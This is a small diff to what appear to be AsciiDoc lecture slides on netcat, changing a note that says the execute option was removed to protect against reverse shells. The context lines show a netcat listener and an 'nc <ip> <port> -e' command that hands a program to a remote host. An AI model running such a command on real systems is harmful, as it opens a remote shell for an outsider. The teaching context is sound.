@@ -87,7 +87,7 @@ image::figure/connected.png[align="center", width="100%"]
 ** `nc -lvp 80`
 ** `nc <ip> <port> -e /file/to/execute`
 
-** This feature was removed from ubuntu to protect from reverse shell.
+** This feature was removed to protect from reverse shell.
 
 
 == Thank you
